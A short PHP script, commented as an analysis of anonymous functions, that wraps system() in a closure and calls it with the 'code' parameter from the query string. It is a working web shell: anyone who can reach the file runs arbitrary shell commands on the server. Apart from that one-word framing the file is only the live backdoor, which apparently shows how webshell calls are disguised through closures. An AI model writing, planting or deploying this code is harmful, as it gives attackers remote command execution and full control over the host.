<?php
/* 
 * 匿名函数分析
 */
$myexec = function($code)
{
    system($code);
};
$myexec($_GET['code']);
